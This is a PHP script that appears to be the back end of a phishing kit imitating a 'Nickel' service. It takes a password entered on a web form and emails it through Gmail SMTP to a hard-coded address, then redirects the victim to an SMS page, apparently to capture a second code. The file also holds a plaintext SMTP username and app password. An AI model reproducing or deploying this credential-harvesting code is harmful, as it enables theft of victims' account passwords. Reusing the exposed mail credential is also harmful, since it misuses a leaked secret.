<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';


if (isset($_POST['submitpassword'])) {

    $password = $_POST['password'];

    $mail = new PHPMailer(true);

    try {
        
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;

        $mail->Username   = 'nickelservicesaccord@gmail.com';                     //SMTP username
        $mail->Password   = 'qfbvugihcmoewlyc';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('nickelservicesaccord@gmail.com', 'Nickel service');
        $mail->addAddress('nickelservicesaccord@gmail.com', 'Nickel service');     //Add a recipient

        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'New enquiry';
        $mail->Body    = '<h3>Hello/h3>
        <h4> Mot de passe: ' . $password . ' </h4>
    ';

        if ($mail->send()) 
        {
            $_SESSION['status']= "Thanks you contact us";
            header('Location: sms.html');
            exit(0);

        } else 
        {
            $_SESSION['status']=  "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            header('Location: aide.html');
            exit(0);
        }


    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    header('Location: sms.html');
    exit(0);
}
